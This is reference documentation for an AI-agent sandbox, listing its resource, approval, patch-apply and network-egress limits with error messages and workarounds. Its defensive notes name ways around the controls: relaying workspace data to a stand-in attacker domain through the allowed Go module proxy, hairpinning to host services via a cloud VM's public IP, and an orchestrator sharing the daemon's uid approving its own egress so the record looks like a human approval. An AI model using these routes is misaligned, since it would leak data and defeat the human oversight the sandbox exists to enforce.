# Limits

Every limit of Tracekit Box v0 is on this page, with its default, what Box says when you hit it, and what to do. When
Box refuses something, the CLI prints the message as `tkbox: <message>` and, when there is one, a hint that says what to
do on a second `tkbox:` line; the [Python SDK](../sdk/python) raises `LimitError` (or `TimedOut`, `Denied`,
`Unavailable`, `Conflict`, `Cancelled`) with `.hint` set. Messages below show example values where the real message has the box's own.

Defaults apply when neither `tkbox run` flags nor [tkbox.yaml](config.md) set a value. Sizes on the command line need a
unit (`--memory 4GiB`, `--disk 16GiB`) and durations always do (`90m`, `2h`).

## Box resources

| Limit | Default | What Box says when hit | What to do |
|---|---|---|---|
| vCPUs per box | 2 (1 to 32) | Out of range at create: `limits.cpus 40: use 1..32`. Inside the box, processes just get N CPUs | `--cpus N` or `limits.cpus` |
| Memory per box | 2GiB (128MiB to 64GiB) | Out of range at create: `limits.memory 64MiB: use 128MiB..64GiB`. When the box runs out, the guest kernel's OOM killer ends a process: the exec exits 137 (SIGKILL) and `tkbox exec` adds `tkbox: the process was killed (SIGKILL); if the box ran out of memory, raise --memory (writes outside /workspace use memory too)`; the kernel's OOM lines are in `boxes/<id>/console.log` | `--memory 4GiB` or `limits.memory`. Files written outside `/workspace` count against memory (see the next row) |
| Writes outside `/workspace` | Each of the rootfs overlay, `/tmp`, `/run` and `/dev/shm` is a tmpfs that can grow to half the box's memory | `No space left on device`, or the OOM killer ends a process | Raise `--memory`, or use an image with your tools already installed |
| Workspace disk (writes to `/workspace`) | 4GiB (64MiB to 1TiB) | Out of range: `limits.disk 32MiB: use 64MiB..1TiB`. When full, the write fails inside the box with `No space left on device` | `--disk 16GiB` or `limits.disk`; keep build output and caches out of `/workspace` |
| Box lifetime | 1h (10s to 168h) | The box is stopped with the reason `timeout: the box reached its 1h0m0s limit (raise it with --timeout)`, and its patch is saved as with `tkbox stop`. A command still running ends with `the box stopped while the command ran` (exit 125) | `--timeout 2h` or `limits.timeout` |
| Time per exec | 30m (1s to 24h) | The guest kills the process group with SIGKILL, `tkbox exec` prints `tkbox: the command was killed by its exec timeout; pass a longer --timeout (up to 24h) or set limits.exec_timeout` and exits 124. If the guest does not answer within 30 s more, the daemon gives up with `the command did not finish within 30m0s` (also 124). Out of range: `tkbox exec: --timeout 500ms: use 1s..24h` (exit 2) | `tkbox exec --timeout 2h`, or `limits.exec_timeout` in tkbox.yaml for every exec |
| Stopping a box with commands running | `tkbox stop` sends SIGTERM to every running exec, waits 3 s, sends SIGKILL, waits 2 s, then saves the patch. Egress closes first, the moment any stop starts (`tkbox stop`, the box timeout, a fail-closed stop, the events log's hard cap, containment): the proxy, its open connections and sessions and the vsock egress listener are closed, and every egress decision from then on is refused (`the box is going down, so nothing more leaves it`), so no secret is swapped in after a stop starts | The exec ends with its signal (exit 143 or 137); the box's events say `stopping: sent SIGTERM to 2 running commands`, and if one still runs, `stopping: some commands did not end after SIGKILL; the diff is taken anyway` | Let commands finish before `tkbox stop`, or have them handle SIGTERM |
| Boxes alive per daemon | 8. Boxes that are creating, running, paused or stopping count; stopped and failed boxes do not | `8 boxes are alive and the daemon's limit is 8`, hint ``stop one with `tkbox stop <box>`, or restart the daemon with a higher --max-boxes`` | `tkbox stop` a box you are done with, or `tkbox daemon --max-boxes N` (1 to 1024) |
| Concurrent execs per box | 64 | `64 execs already running (limits.max_procs)`, hint `at most 64 commands run at once in a box; wait for one to finish` | Wait for one to finish; run fewer background processes per exec |
| Output per exec (stdout and stderr together) | 256 MiB | The rest is dropped, and `tkbox exec` prints `tkbox: output past 256 MiB was dropped; write large output to a file and read the part you need` | Write large output to a file in the box and read the part you need |
| Stdin per exec (`tkbox exec -i`) | The daemon holds up to 4 MiB that the process has not read yet; the guest holds 1 MiB more and waits while the process keeps reading, but not for a process that takes none of it for 2 s | The process is never handed a false end of input. Its process group is killed (SIGKILL), the rest of stdin is dropped, the exit status says so (`stdin_truncated`, `stdin_dropped_bytes`), the signer's record of the exec has `stdin_truncated: true`, and `tkbox exec` prints `tkbox: stdin was not consumed fast enough (N bytes dropped); the command was stopped: write large input to a file in /workspace and read it from there` and exits 125. More than 4 MiB before the command starts: it is not started (`more than 4 MiB of stdin arrived before the command started, so it was not started (nothing ran)`, exit 125) | Write large input to a file in `/workspace` and have the command read the file |
| Stdin known up front (the API's `stdin_data`: MCP's `tkbox_exec`, the SDK given bytes or str) | At most 1 MiB, base64 in the JSON request. It is decided with the command (`stdin_sha256`, `stdin_bytes`, and `stdin_text` when it is UTF-8 of at most 4 KiB) and exactly that data is the process's stdin. The SDK sends bytes or str over 1 MiB, and file objects, as streamed stdin instead | `stdin_data is 1100000 bytes, over the 1 MiB limit`, hint ``stream larger input instead (`tkbox exec -i`, or a file object in the SDK), or write it to a file in /workspace and read it from there``; a request body too large to read: `the exec request is too large: the command is too long to record (over 1 MiB) or stdin_data is over 1 MiB`. Both `stdin_data` and streamed stdin in one request: `stdin and stdin_data are both set` | Stream larger input, or write it to a file in `/workspace` |
| Credentials in up-front stdin | `stdin_text` (up-front stdin of at most 4 KiB of UTF-8) is signed verbatim in the run's decision. Only Box secrets' values and placeholders are redacted (and a secret's value is refused outright); any other credential, such as a password piped to `docker login --password-stdin` through MCP's `tkbox_exec` `stdin` or the SDK's `stdin=` bytes or str, lands in the run's record and its export. Streamed stdin is recorded only as its `stdin_sha256` and `stdin_bytes`, an unsalted sha256 that can be guessed for a short password | Nothing: the command runs and the text is recorded | Stream credentials instead (`tkbox exec -i`; in the SDK, a file object such as `io.BytesIO(password)`), so only their digest is recorded; for HTTP credentials use a Box secret, which never enters the box |
| A client that stops reading | 2 s, once the exec is cancelled or the box stops | The daemon stops writing to that client and finishes the exec without it | Nothing; read the exec's output as it comes |
| Console log | The first 8 MiB per box (`boxes/<id>/console.log`) | The log ends with `[tkbox: console output reached the 8388608 byte cap; the rest is dropped]` | The console log is for boot problems; what happened at the doors is in `tkbox events <box>` |
| Guest boot | 60 s for the guest agent to answer | `the guest did not come up within 1m0s: read <state dir>/boxes/<id>/console.log` (the cause is in the box's events), or `the VM exited while booting (…)` | Read the console log; it is usually the image (no usable `/bin/sh`, wrong architecture) or the host (KVM) |

## Commands, approvals and changes

| Limit | Default | What Box says when hit | What to do |
|---|---|---|---|
| Approval wait (a host off the allowlist) | 2 min (`tkbox daemon --approval-timeout`, 1s to 4m) | While it waits, on the exec's stderr: ``tkbox: egress to https://example.com:443 is waiting for approval: run `tkbox approve apr-1a2b3c4d` on the host (add --box to allow it for the rest of the box); next time start the box with `--allow example.com` ``. Unanswered: `tkbox: approval apr-1a2b3c4d for https://example.com:443 expired after 2m0s`, and the connection is refused with 403 ``no one approved egress to https://example.com:443 within 2m0s (apr-1a2b3c4d); next time answer sooner with `tkbox approve apr-1a2b3c4d --box` (allows it for the rest of the box), or start the box with `--allow example.com` `` | Answer sooner with `tkbox approve <id>`, approve for the whole box with `tkbox approve <id> --box`, or put the host on the allowlist. In CI nobody answers: allow what the job needs |
| Pending approvals per box | 16 | A connection that would need a 17th is refused at once with 403 ``too many pending approvals in this box (16): egress to https://example.com:443 refused at once; answer the pending ones with `tkbox approvals`, or start the box with `--allow example.com` `` | Answer or reject the pending ones (`tkbox approvals`); put the hosts the job needs on the allowlist |
| New approvals per box | 30 a minute (withdrawn and expired ones count) | A connection that would open a 31st within a minute is refused at once, without asking anyone, with 403 ``this box opened 30 approvals in the last 1m0s: egress to https://example.com:443 refused at once without asking anyone; start the box with `--allow example.com` if it needs that host`` | Put the hosts the job needs on the allowlist |
| Approvals nobody waits for | When the last connection waiting on an approval goes away (the client gave up or was killed), the approval is withdrawn and dropped at once: it can no longer be approved and leaves `tkbox approvals`. `tkbox approvals --json` shows how many connections wait on each (`waiters`) | `tkbox: approval apr-1a2b3c4d for https://example.com:443 was withdrawn: no connection waits for it any more`; approving it then says `no approval "apr-1a2b3c4d"` | Retry the command, then answer the new approval |
| Decision time per connection | The approval wait plus 30 s (2m30s) | 403 `no decision within 2m30s` | Answer approvals sooner |
| Signer approval (a command the signer's policy holds) | No limit of its own: Box asks the signer in 300 s calls until it answers, or until the exec is abandoned or the box stops | `tkbox: waiting for approval <id>: approve with: tracekit approvals approve <id>`. If it is rejected or expires: `denied: held by Tracekit policy (…) and not approved: expired`, exit 126 | Answer with `tracekit approvals approve <id>` on the signer's host |
| Command line size | 1 MiB: the signer's request stops there; the daemon's exec request takes 1 MiB for the command plus room for 1 MiB of `stdin_data` | A command whose decision would be over 1 MiB: `tkbox: the command is too long to record (over 1 MiB)`, hint `put it in a script in /workspace and run that` (exit 125). An exec request too large to read: `the exec request is too large: the command is too long to record (over 1 MiB) or stdin_data is over 1 MiB` | Write long scripts or data to a file in `/workspace` and run the file |
| Env per exec (`tkbox exec --env`) | Any name except the proxy and CA variables Box sets and the names that change what runs: every name starting `LD_`, `DYLD_`, `GIT_`, `XDG_`, `PYTHON`, `PERL`, `RUBY`, `NODE_`, `JAVA_`, `JDK_`, `_JAVA_`, `LUA_` or `BASH_`, or `NPM_CONFIG_` in any case (except `GIT_AUTHOR_NAME`, `GIT_AUTHOR_EMAIL`, `GIT_AUTHOR_DATE`, `GIT_COMMITTER_NAME`, `GIT_COMMITTER_EMAIL`, `GIT_COMMITTER_DATE`, `NODE_ENV`, `PYTHONUNBUFFERED`, `PYTHONDONTWRITEBYTECODE`, `PYTHONIOENCODING`, `PYTHONUTF8`, `PYTHONHASHSEED` and `PYTHONFAULTHANDLER`), and `PATH`, `HOME`, `ENV`, `PROMPT_COMMAND`, `SHELLOPTS`, `BASHOPTS`, `PS4`, `IFS`, `CDPATH`, `GLOBIGNORE`, `ZDOTDIR`, `FPATH`, `GCONV_PATH`, `GLIBC_TUNABLES`, `CLASSPATH`, `GEM_PATH`, `GEM_HOME`, `BUNDLE_GEMFILE`, `MAKEFILES`, `MAKEFLAGS`, `GOFLAGS`, `GOENV`, `GOTOOLCHAIN`, `RUSTC`, `RUSTC_WRAPPER`, `RUSTC_WORKSPACE_WRAPPER`, `RUSTFLAGS`, `CARGO_HOME`, `CARGO_BUILD_RUSTC`, `CARGO_BUILD_RUSTC_WRAPPER`, `CC`, `CXX`, `CPP`, `LD`, `PHPRC`, `PHP_INI_SCAN_DIR`, `LESSOPEN`, `LESSCLOSE`, `EDITOR`, `VISUAL`, `PAGER`, `MANPAGER`, `SSH_ASKPASS` and `PIP_CONFIG_FILE`. The env an exec does get is in its decided command line as a leading `env K=V …` (sorted, placeholders shown as `tkbox_NAME_…`) as well as in the decision's `env`, so the signer's own rules see it; a program name containing `=` can't take a per-command env. The box's own `--env` may set any of these; it is recorded when the box is created. No value may hold a secret's value | `env LD_PRELOAD can't be set per command`, hint `it changes what the command runs without showing in the command the signer decides; put it in the command itself (e.g. sh -c 'LD_PRELOAD=… cmd') so it is decided`. A program name with `=`: `a program name with = can't take a per-command env`. A value holding a secret's value: `env TOKEN holds the value of secret GH`, hint `use the secret's placeholder ($GH in the box) instead; its value never enters the box` | Put the variable in the command (`sh -c 'VAR=… cmd'`), or in the box's `env`; use a secret's placeholder, never its value |
| What the signer sees of a command | The `Bash` decision's `command` is argv shell-quoted, led by `env K=V …` when the exec has its own env; a first word that contains `=` or is a shell reserved word (`if`, `then`, `for`, …) is quoted (`'X=1' echo hi`), so a shell parser reads the program that runs; a first word starting with `%` (which bash and zsh run as a job spec, quoted or not) is refused: `a program name may not start with %: a shell reads it as a job spec, so the record could not name the program`, hint `rename it or run it by path (./%1)`. `stdin` is true when the exec has stdin. Stdin known up front (`stdin_data`: MCP's `tkbox_exec`, the SDK given bytes or str of at most 1 MiB) is in the decision as `stdin_sha256` and `stdin_bytes`, plus `stdin_text` when it is UTF-8 of at most 4 KiB (secret placeholders and values redacted), and exactly that data is the process's stdin; streamed stdin (`tkbox exec -i`, larger SDK input, file objects) is known only afterwards, so its `stdin_sha256` and `stdin_bytes` are in the exec's completion. What the command starts itself is not decided | Nothing | To have a script's content decided before it runs, give it as up-front stdin (`stdin_data`) or put it in the command line rather than streaming it |
| Ctrl-C before the command starts | A signal (or a closed connection) while the signer decides or an approval waits cancels the exec: the decision is abandoned and a pending signer approval is withdrawn | `tkbox: cancelled before the command started (nothing ran)`, exit 125 | Nothing; run the command again |
| What an MCP client's `tkbox_run` and `tkbox_exec` may set | Only narrower than the operator's `tkbox mcp` setup: allow entries from the config's `allow` list, an image that is the config's or one of `--image`, a workspace inside a `--workspace-root` (without one: only the config's own workspace; the box gets the path with symlinks resolved, the one that was checked), cpus, memory and timeout at most the config's, a `tkbox_exec` timeout at most the config's `exec_timeout`, no env, no task (the box records the config's task, the only trusted one) and no name (the box is named by its id, even when the config sets `name`). A limit the config leaves unset (or no `--config`) caps at the daemon's default (2 cpus, 2GiB, 1h, exec 30m), never the maximum. `tkbox_exec`, `tkbox_diff`, `tkbox_stop` and `tkbox_ls` reach only the boxes the same `tkbox mcp` process created with `tkbox_run`: a `box` argument is resolved through them to the owned box's id, other boxes on the daemon are refused and not listed, and a second key that spells `box` in another case (`"BOX"`) is refused. When the session ends (the client closes stdin), `tkbox mcp` stops the boxes it created: their patches are saved and their runs stay open for the operator's apply and export | `image "x" is not one the operator allows (…)`, `tkbox_run may not add "example.com" to the allowlist: it is not in the operator's (…)`, `workspace … is outside the dirs the operator allows (tkbox mcp --workspace-root)`, `cpus 8 is over the operator's 2`, `timeout 1h is over the operator's exec timeout 30m0s`, `tkbox_run may not set env for every command (…)`, `tkbox_run takes no task: …`, `tkbox_run takes no name: a box created over MCP is named by its id`, `box tkb-… was not created by this tkbox mcp session: it may only use the boxes its tkbox_run created`, each with the hint ``an MCP client may only narrow what the operator set up in `tkbox mcp` (--config, --image, --workspace-root); ask the operator``; and, without that hint, `argument "BOX": use "box"` | Ask the operator to widen the `tkbox mcp` setup |
| The MCP client and the daemon's uid | The daemon's API takes any process of its own uid (and root), and records who answered an approval as that peer uid (`uid:<n>`), not a verified person. The MCP narrowing assumes the MCP client has no other access as that user: an orchestrator that also has a shell as the daemon's user can call the API directly (boxes with any allowlist, any box) or run `tkbox approve` on the approval ids `tkbox_exec` shows it, and the record then shows an approver that looks like a person | Nothing: the API can't tell such a process from a person | Run the orchestrator as another user and start `tkbox mcp` as the daemon's user through a rule for exactly that command (a sudoers entry, say); keep the people who approve off the orchestrator's uid |
| Task text | 64 KiB | `task is over 64 KiB`, hint `shorten the task text` | Put the details in a file in the workspace and refer to it |
| Box names | `[a-z0-9][a-z0-9-]{0,62}`, not starting with `tkb-`, unique among the daemon's boxes in any state | `name "Demo" is not valid`, hint `use lower case letters, digits and -, starting with a letter or digit (at most 63)`; `a box named "demo" already exists (stopped)` (the existing box's state) | Pick another name, or `tkbox rm` the old box |
| Workspace patch (`tkbox diff`, `tkbox apply`) | 64 MiB. Generated directories (`node_modules`, `__pycache__`, `.venv`, `venv`, `.tox`, `.mypy_cache`, `.pytest_cache`, `.gradle`, `.next`, `.cache`) are left out and do not count; that fixed list is all the guest leaves out. New files the workspace's `.gitignore` ignores (build output such as `dist/`) are in the patch and count; only `tkbox apply` leaves them out. The list of changed files is built on the host from the patch and served as JSON at `GET /v1/boxes/{box}/diff/summary` (`tkbox diff --stat`, the SDK's `diff_summary()`); the diff response carries it in the `X-Tkbox-Diff-Summary` header only when it is at most 8 KiB, else it sends `X-Tkbox-Diff-Summary-Omitted: 1` and clients fetch the endpoint, so very many or very long paths do not break review | On a running box: `the workspace diff is over 64 MiB`, hint `keep build output and large files out of /workspace (write them under /tmp)`. At stop the patch is not saved: `tkbox stop` prints `tkbox: WARNING: the workspace patch was over 64 MiB when box demo stopped, so no diff was saved; …` and `tkbox: WARNING: nothing can be applied from this box`; later `tkbox diff` and `tkbox apply` say `box demo (stopped) has no saved diff: …` with the same reason (`tkbox ls` shows it too) | Remove build output and other large generated files from `/workspace` before stopping the box |
| No saved patch for other reasons | A patch is saved only when a running box is stopped cleanly | `box demo (stopped) has no saved diff: …` with the reason: `the box was killed (--kill or containment), so its workspace diff was not saved`; `the VM was paused (held by Tracekit) when it stopped, …`; `the guest did not send the workspace diff within 60s, so no diff was saved`; `the daemon stopped while the box was alive, so its workspace diff was not saved`; `the box failed (…), so its workspace diff was not saved` | Stop boxes with `tkbox stop` (not `--kill`) while the daemon runs |
| Text diffs | Files over 16 MiB | They appear in the patch as binary changes | Nothing |
| When `tkbox apply` works | On a stopped box, from the patch saved at stop, while the box's Tracekit run is still open: after `tkbox stop` and before `tkbox export` or `tkbox rm`, with the daemon that ran the box. A daemon with a signer refuses the patch of a box that ran `--unrecorded` (its files would be written with no `Write` decisions); an unrecorded daemon applies an unrecorded box's patch, with no decisions, even after a restart | On a live box: `box demo is running`, hint ``stop the box first so the patch can't change under you: `tkbox stop demo` ``. An unrecorded box on a daemon with a signer: `box demo ran unrecorded, so this recording daemon can't decide or record its writes; apply the saved patch by hand after review: <state dir>/boxes/<id>/diff.patch`, hint ``review it with `tkbox diff demo`, then apply it yourself: git apply <state dir>/boxes/<id>/diff.patch``. After export: ``box demo's Tracekit run was closed by `tkbox export`, so its writes can no longer be recorded``. After a clean daemon restart: `box demo's Tracekit run is closed (<the box's stop reason>), so nothing more can be applied`, usually `(stopped by the operator)`, and `(daemon shutdown)` only for a box that was still running at shutdown. After a daemon crash: `the box's Tracekit run ended when the daemon restarted; apply the saved patch by hand after review: <state dir>/boxes/<id>/diff.patch`. Each hint names `git apply <state dir>/boxes/<id>/diff.patch` for applying by hand | `tkbox stop`, then `tkbox apply`, then `tkbox export` |
| What `tkbox apply` writes | Nothing unless the signer allows every file; then every file, one at a time, each atomically (a failure part way is not rolled back: see below). `git apply` never runs on the checkout. Every path the patch touches (the old and the new name of a section) is decided. Copy and rename sections, sections whose old and new names differ without a rename header, more than one section for a path, changes to files the checkout's `.gitignore` ignores, and writes inside the checkout's git dir or hooks dir are refused. The hooks dir is git's own answer (`git rev-parse --git-path hooks`, given the `core.hooksPath` that `git config --type=path --get-all` reads from the repo, global or system config), compared without regard to case and by file identity; when the target is in a git repository but git can't say where those dirs are, the apply is refused. A `GIT binary patch` section must be exactly what git reads (`literal N` or `delta N`, base85 lines whose length character matches, a terminating empty line, at most one reverse hunk). Git itself must read the filtered patch the same way: `git apply --numstat -z` and `--summary -z`, with an empty git dir and an empty work tree, must give the parser's paths, binary flags, creations, deletions and modes, and anything on git's stderr refuses the patch. New files the checkout ignores are left out. Changes to `.gitignore`, `.gitattributes`, `.gitmodules`, `tkbox.yaml`, `tkbox.yml`, `.envrc`, `.pre-commit-config.yaml`, `.gitlab-ci.yml`, `.yarnrc.yml`, `lefthook.yml` (in any directory), `.husky/**`, `.github/workflows/**`, `.github/actions/**`, `.circleci/**`, `.devcontainer/**`, `.vscode/tasks.json`, `.cargo/config.toml`, and to credential files (the list under [Credential files](#behaviour): `.npmrc`, `.netrc`, `*.pem`, `*.key`, …) need `--allow-sensitive`. Two applies of one box run one after the other | `tkbox: denied by the signer: <path>` for each denied file, then `2 files refused, so nothing was applied`. Sensitive files: `the patch changes files that steer the next run or host automation: .github/workflows/ci.yml`, hint ``review them with `tkbox diff demo`, then run `tkbox apply demo --allow-sensitive`; nothing was applied``. Others: `the patch copies or renames "a.txt"; a box never makes such patches, so it is refused`; `unsafe paths in the patch: a section changes ".gitignore" into "notes.txt" without a rename or copy header (git apply would delete ".gitignore"); a box never makes such patches`; `the patch changes "dist/x.js", which the checkout ignores (.gitignore); ignored files never reach the box, so this patch did not come from it`; `the patch writes "GitHooks/pre-commit", inside the checkout's git hooks dir (…)`; `unsafe paths in the patch: …`; `unsafe or unreadable patch: patch line 12: not a line of a GIT binary patch (…); git would read it differently`; `git reads the patch differently than tkbox does, so it is refused: …`; ignored new files: `tkbox: left out 2 new files the checkout ignores (.gitignore): …` | Review the patch (`tkbox diff`); pass `--allow-sensitive` only after reading those files' changes |
| Applying to a dir that is not a git work tree | When the box's workspace was a git work tree, the target must be one too (or git must work there): otherwise which files it ignores, and so never reached the box, can't be checked. A box whose workspace was not a git work tree (or had none) ignores nothing and applies anywhere | Refused: `<dir> is not a git work tree (…), but the box's workspace was one: which files git ignores there (and so never reached the box) can't be checked`, hint ``apply to a git checkout (--dir), or fix git there (`git status`); nothing was applied`` | Apply to the git checkout the box came from, or fix git there |
| The checkout changed after the box started | The patch must apply to the checkout as it is now: before anything is decided it is applied to a scratch copy of the files it touches (2 min at most). After the decisions, each scratch result must still be what the signer decided (sha256, mode, symlink, deleted) and the checkout must be unchanged since the decisions; only then does Box write the files itself (a temp file in the same dir opened `O_EXCL`/`O_NOFOLLOW`, chmod, rename; a symlink under a temp name, renamed; no symlinked parent; a deletion removes only a file or symlink). Once every file is decided, the writes run to the end even if the client goes away | `the patch does not apply to <dir>: …`, hint `the checkout changed since the box started; nothing was applied (the patch is at …)`. Before any write: `the patched 2 files differ from what was decided: …` or `the checkout changed while the patch was decided: …` (nothing was written). If writing failed: `writing the patched files failed after writing 1 file: a.txt: …` (exactly the paths written; they are not rolled back, and the run's `Write` completions name them as `written_paths`), hint ``review the checkout with `git status` and `git diff` (the patch is at …)``, or `writing the patched files failed: …` when nothing was written. If a file changed while the files were written: `applied, but 2 files differ from what was decided: …` (the files were written; review with `git diff`) | Don't change the checkout while a box works on it; apply the saved patch by hand after review |
| Events (`tkbox events`, `boxes/<id>/events.ndjson`) | 64 MiB per box for egress and signer-problem lines; 256 MiB for the whole file | At 64 MiB one `events.capped` line is written (`events.ndjson reached 64 MiB: egress and signer-problem lines are no longer written (lifecycle, exec, secret, approval, containment and apply lines still are)`) and later egress and signer-problem lines are dropped. At 256 MiB one more line (`events.ndjson reached its hard cap of 256 MiB: no more lines are written and the box is stopped`), only the stop's own lines follow (1 MiB at most), and the box is stopped with the reason `events log over its hard cap` | Start a new box; find what floods the log (`tkbox events`) |
| Records Box must keep | Secret use and leaks, model calls, Box approvals and containment go to the signer through a queue of 4096; lifecycle records are sent synchronously; a Box approval is recorded before any connection uses it. A stopping box gives the signer 30 s for what is queued, then drops the rest and waits up to 5 s more until every dropped record is counted | Never dropped silently. If one cannot be queued or the signer refuses it, the box is stopped with the reason `could not record tkbox.secret.use in Tracekit, so the box was stopped (fail closed)` (shown by `tkbox ls`), and what was lost is recorded in the run as an observe `tkbox.gap {kind, dropped, reason}`. If even that cannot be recorded, or the losses could not all be counted (`records lost: the observer did not stop within 5s of giving up on the signer, so the tkbox.gap record may not count every lost record`), the run is closed with what was lost as its close reason, so apply refuses it (`box demo's Tracekit run is closed (…; records lost: …)`). An approval that cannot be recorded allows nothing (`the approval apr-… could not be recorded in Tracekit, so egress to … stays closed (fail closed): …`), and like any other lost record it stops the box and is counted in `tkbox.gap` (kind `tkbox.approval`). A decision whose completion (the exit status of an exec, the outcome of a connection or an apply) could not be recorded is counted in `tkbox.gap` too, with kind `complete`, without stopping the box (once the box is down, for an apply say, a `tkbox.gap` record is sent for it at once) | Check the signer (`tracekit status`) and start a new box |
| Egress refusals Box records itself | 20 a second per box; the rest are counted | One summary observe a second: `N more refusals Box made itself were not recorded one by one (at most 20 a second)` | Nothing |
| Export | 60 s for the run to be final and verified in the signer | `tracekit export of run …: not final and verified within 1m0s: …` | Check the signer (`tracekit status`) and run `tkbox export` again |
| Export after a daemon crash | The run token lives only in the daemon's memory and is never written to disk. A clean shutdown closes every open run, so those boxes still export. After a crash (or `kill -9`) the run stays open in the signer and no daemon can close it | Refused at once: `box demo's Tracekit run <run id> was left open: the daemon that held its token stopped without closing it (it crashed or was killed), and a restarted daemon can't close it`, hint `the signer still holds the run's records, but a bundle needs a closed run; start a new box for a bundle`. Apply is refused too (see above) | Stop the daemon with SIGINT or SIGTERM, never SIGKILL; export boxes before restarting it |
| Closing a run with calls in flight | Export and rm never close a run under an in-flight decision (exec, egress, apply, for example an apply waiting for approval): they wait up to 10 s, then refuse. Daemon shutdown (and a failed or quarantined box) waits up to 15 s, then closes the run anyway | Export and rm: `box demo still has 1 call in flight (an apply waiting for approval?); wait or answer it`, hint ``wait for it to finish, or answer the pending approval (`tracekit approvals`), then try again`` (exit 1). Shutdown: the box's events say `closing the Tracekit run while gated calls are still in flight (they did not finish within 15s)` | Let execs and applies finish (answer their approvals) before exporting or removing |
| Frame size (exec stream, guest protocol) | 1 MiB | Clients never see it: Box and the SDK split data into 1 MiB frames. A peer that sends a larger frame is disconnected with `proto: frame larger than 1 MiB` | Nothing; if you see it, report a bug |

## Network

| Limit | Default | What Box says when hit | What to do |
|---|---|---|---|
| Ports | A `host` entry allows HTTPS on 443 and plain HTTP on 80; `host:port` allows that port only | A port that is not allowed is treated like a host off the allowlist: it waits for approval, and the notice suggests `--allow host:port` (with `inspect: all` it is refused at once, see below) | Add `host:port`, for example `--allow registry.example.com:8443` |
| HTTPS tunnels | A `CONNECT` tunnel must start with a TLS ClientHello whose server name (SNI) equals the `CONNECT` host (a `CONNECT` to an IP literal may send no SNI) | The client sees a TLS alert, and `tkbox exec` prints `tkbox: egress to … refused: the TLS server name "a.example" is not the CONNECT host b.example` (or `the TLS ClientHello has no server name (SNI); Box needs it to match the CONNECT host`) | Connect by the real host name |
| Encrypted ClientHello (ECH) | Refused: Box must see the server name | `encrypted ClientHello (ECH) can't be checked: Box must see the server name the host will serve; turn ECH off in the client`. Chromium-based browsers and tools built on them send a GREASE ECH extension by default, so they may hit this on every HTTPS site (not verified against every version) | Turn ECH off in the client; for Chromium, try disabling its encrypted ClientHello setting or flag (unverified) |
| `CONNECT` to port 80 | Refused | 403 `port 80 tunnels are refused: send plain HTTP through the proxy`, hint `Set http_proxy (HTTP_PROXY) to the proxy so clients send absolute-form requests (GET http://host/path); Box writes the Host header itself.` | Send plain HTTP as absolute-form proxy requests, which `http_proxy` (set in every box) already does |
| Tunnels that are not TLS | Only to an allow entry that names the port (`host:port`, also `example.com:443` written out or `*.example.com:8443`), never a bare host or a preset. Such an entry then lets any protocol through to that port (SSH, SMTP, a database protocol), uninspected. Each connection is decided before its first byte, so the signer's `WebFetch` url names only what is known then: `https://host:443` for a tunnel to 443 (TLS is required there unless the allow entry names the port, `host:443`, which lets any protocol through and is still recorded as `https://`), `tcp://host:port` for a tunnel to any other port (TLS or not), `http://host:80` for plain HTTP | 403 `the tunnel does not carry TLS: only an allow entry that names the port (host:port) lets other protocols through`, hint `Send HTTPS through the tunnel, plain HTTP through the proxy in absolute form (http_proxy), or ask the operator to allow host:port.` | Add the exact `host:port`, knowing it allows any protocol there |
| Private and special addresses | Loopback, RFC 1918, CGNAT, ULA, link-local, multicast, documentation and other special ranges, the cloud metadata addresses (169.254.169.254, fd00:ec2::254, 169.254.170.2, 100.100.100.200, 168.63.129.16 and others) and this host's own addresses (re-read at most every 5 s, so an address the host gains while a box runs is refused too) are refused, also when a name resolves to them | 403 `it resolves to a link-local address, which Box never connects to`, hint `Box connects only to public addresses; use a public host.` For an allowlisted name or an IP literal this comes at once, with no approval offered; for a name off the allowlist, the address is checked after a person approves it | Nothing in v0: a box cannot reach services on the host or its private network. Expose the service on a public address with its own authentication |
| The host's public IP on a cloud VM | Box knows this host's addresses from its interfaces. On EC2, GCE, Azure and GitHub-hosted runners the public IPv4 is NAT'd and on no interface, so it is not refused unless you pass it with `tkbox daemon --egress-block`: a box allowed (or approved) to reach it can hairpin to services the host listens on (`0.0.0.0`), where the cloud firewall lets that through | Without `--egress-block`: nothing, the connection goes through. With it: 403 `it resolves to an address of this host or one the operator blocked, which Box never connects to` | Start the daemon with `--egress-block 203.0.113.7` (the public IP; repeatable or comma-separated, a CIDR or a bare address) on a cloud VM; and bind host services to loopback |
| Presets that fetch on the guest's behalf | `go-proxy` (`proxy.golang.org`, `sum.golang.org`) fetches modules from whatever host a module path names: `GET https://proxy.golang.org/evil.example/<data>/@v/list` makes the mirror contact `evil.example`, so the agent can relay data to a domain of its choosing through an allowed host. Any allowed host that fetches URLs for its callers does the same | Nothing: the request is to an allowed host | Treat such presets as a way out for workspace data (not secret values, which never enter the box). Leave them out when that matters, and vendor modules (`go mod vendor`, `-mod=vendor`) instead |
| Connect timeout | 10 s (name resolution and TLS handshakes also 10 s each) | 502 `could not connect: …`, hint `The host did not accept the connection; try again later.`; a name that does not resolve: `could not resolve the host name`. `tkbox exec` also prints `tkbox: egress to … failed: …` | Check the host is up; not configurable in v0 |
| Idle connection | 5 min with no traffic either way (paused while a decision is pending) | The connection is closed; the client sees a reset or an unexpected EOF | Use keepalives for long polls and streams; not configurable in v0 |
| Concurrent connections per box | 256 (no setting in v0) | 503 `the box already has 256 open connections (MaxConns)` | Lower the agent's or the tool's parallelism; reuse keep-alive connections |
| Request head | 64 KiB (request line plus headers) | 431 `the request head is larger than 65536 bytes (MaxHeaderBytes)`, hint `Send fewer or smaller headers (large cookies are the usual cause).` | Send large data in the body |
| Upstream response head | 1 MiB, on connections the proxy reads | 502 `the host sent no valid response: its response head is larger than 1048576 bytes` | Nothing; the host is misbehaving |
| HTTP versions through inspection | HTTP/1.1 only on inspected connections (bound hosts, or every allowed host with `inspect: all`) | Clients that require HTTP/2 (gRPC) fail the ALPN negotiation on those hosts | Let the client fall back to HTTP/1.1; for gRPC, do not bind a secret to that host and keep `inspect: bound` |
